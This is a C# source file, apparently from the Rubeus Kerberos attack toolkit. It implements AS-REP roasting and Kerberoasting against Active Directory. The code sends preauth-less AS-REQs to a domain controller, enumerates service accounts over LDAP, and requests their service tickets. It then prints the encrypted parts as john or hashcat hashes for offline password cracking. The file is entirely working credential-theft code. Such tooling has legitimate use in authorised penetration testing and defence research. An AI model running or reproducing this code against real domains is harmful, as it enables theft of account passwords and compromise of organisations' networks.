using System;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;

using Rubeus.Asn1;

namespace Rubeus
{
    public class Roast
    {
        public static void ASRepRoast(string userName, string domain, string domainController = "", string format = "john")
        {
            GetASRepHash(userName, domain, domainController, format);
        }

        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "")
        {
            // roast AS-REPs for users without pre-authentication enabled
            Console.WriteLine("[*] Action: AS-REP Roasting");

            string dcIP = Networking.GetDCIP(domainController);
            if (string.IsNullOrEmpty(dcIP)) {
                return;
            }
            Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac);
            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
            if (null == response) {
                return;
            }
            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);
            // check the response value
            int responseTag = responseAsn.TagValue;
            switch (responseTag) {
                case 11:
                    Console.WriteLine("[+] AS-REQ w/o preauth successful!");
                    // parse the response to an AS-REP
                    AS_REP rep = new AS_REP(response);
                    // output the hash of the encrypted KERB-CRED in a crackable hash form
                    string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
                    repHash = repHash.Insert(32, "$");
                    string hashString = (format == "john") 
                        ? string.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash)
                        // eventual hashcat format
                        : string.Format("$krb5asrep${0}$*{1}${2}*${3}${4}",
                            (int)Interop.KERB_ETYPE.rc4_hmac, userName, domain, repHash.Substring(0, 32), repHash.Substring(32));
                    Console.WriteLine("[*] AS-REP hash:\r\n");
                    // display the base64 of a hash, columns of 80 chararacters
                    foreach (string line in Helpers.Split(hashString, 80)) {
                        Console.WriteLine("      {0}", line);
                    }
                    return;
                case 30:
                    Helpers.DisplayKerberosError(responseAsn);
                    return;
                default:
                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
                    return;
            }
        }

        public static void Kerberoast(string spn = "", string userName = "", string OUName = "",
            System.Net.NetworkCredential cred = null)
        {
            Console.WriteLine("[*] Action: Kerberoasting");

            if (!string.IsNullOrEmpty(spn)) {
                Console.WriteLine("\r\n[*] ServicePrincipalName   : {0}", spn);
                GetDomainSPNTicket(spn);
                return;
            }
            DirectorySearcher userSearcher = null;
            DirectoryEntry directoryObject = null;
            string bindPath = "";

            try {
                string canonicOUName = string.IsNullOrEmpty(OUName)
                    ? string.Empty
                    : OUName.Replace("ldap", "LDAP").Replace("LDAP://", string.Empty);
                if (null != cred) {
                    bindPath = string.Format("LDAP://{0}{1}", cred.Domain,
                        string.IsNullOrEmpty(OUName)
                            ? string.Empty
                            : "/" + canonicOUName);
                }
                else if (!string.IsNullOrEmpty(OUName)) {
                    bindPath = string.Format("LDAP://{0}", canonicOUName);
                }
                directoryObject = string.IsNullOrEmpty(bindPath)
                    ? new DirectoryEntry()
                    : new DirectoryEntry(bindPath);
                if (null != cred) {
                    // if we're using alternate credentials for the connection
                    string userDomain = string.Format("{0}\\{1}", cred.Domain, cred.UserName);
                    directoryObject.Username = userDomain;
                    directoryObject.Password = cred.Password;

                    using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain)) {
                        if (!pc.ValidateCredentials(cred.UserName, cred.Password)) {
                            Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
                            return;
                        }
                    }
                }
                userSearcher = new DirectorySearcher(directoryObject);
            }
            catch (Exception ex) {
                Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                return;
            }
            // check to ensure that the bind worked correctly
            try {
                Guid guid = directoryObject.Guid;
            }
            catch (DirectoryServicesCOMException ex) {
                if (!String.IsNullOrEmpty(OUName)) {
                    Console.WriteLine("\r\n[X] Error creating the domain searcher for bind path \"{0}\" : {1}",
                        OUName, ex.Message);
                }
                else {
                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                }
                return;
            }
            try {
                userSearcher.Filter = (string.IsNullOrEmpty(userName)) 
                    ? "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
                    : string.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0}))", userName);
            }
            catch (Exception ex) {
                Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                return;
            }
            try {
                SearchResultCollection users = userSearcher.FindAll();
                foreach (SearchResult user in users) {
                    string samAccountName = user.Properties["samAccountName"][0].ToString();
                    string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                    string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
                    Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                    Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
                    GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred);
                }
            }
            catch (Exception ex) {
                Console.WriteLine("\r\n  [X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                return;
            }
        }

        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "",
            System.Net.NetworkCredential cred = null)
        {
            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase)) {
                // extract the domain name from the distinguishedname
                domain = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase).
                    Groups["Domain"].ToString().Replace("DC=", "").Replace(',', '.');
            }
            try {
                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
                //  GetRequest() stream was constributed to PowerView by @machosec
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                ticket = (null != cred)
                    ? new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString())
                    : new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                byte[] requestBytes = ticket.GetRequest();

                if ( !((requestBytes[15] == 1) && (requestBytes[16] == 0)) ) {
                    Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                    return;
                }

                // ignore the GSSAPI frame
                byte[] apReqBytes = new byte[requestBytes.Length-17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
                AsnElt apRep = AsnElt.Decode(apReqBytes);
                if (apRep.TagValue != 14) {
                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
                }
                long encType = 0;
                foreach (AsnElt elem in apRep.FirstElement.EnumerateElements()) {
                    if (3 != elem.TagValue) {
                        continue;
                    }
                    foreach (AsnElt elem2 in elem.FirstElement.FirstElement.EnumerateElements()) {
                        if (3 != elem2.TagValue) {
                            continue;
                        }
                        foreach (AsnElt elem3 in elem2.FirstElement.EnumerateElements()) {
                            switch (elem3.TagValue) {
                                case 0:
                                    encType = elem3.FirstElement.GetInteger();
                                    continue;
                                case 2:
                                    byte[] cipherTextBytes = elem3.FirstElement.GetOctetString();
                                    string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                    string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                    bool header = false;
                                    foreach (string line in Helpers.Split(hash, 80)) {
                                        if (!header) {
                                            Console.WriteLine("[*] Hash                   : {0}", line);
                                        }
                                        else {
                                            Console.WriteLine("                             {0}", line);
                                        }
                                        header = true;
                                    }
                                    Console.WriteLine();
                                    continue;
                                default:
                                    continue;
                            }
                        }
                    }
                }
            }
            catch (Exception ex) {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            }
        }
    }
}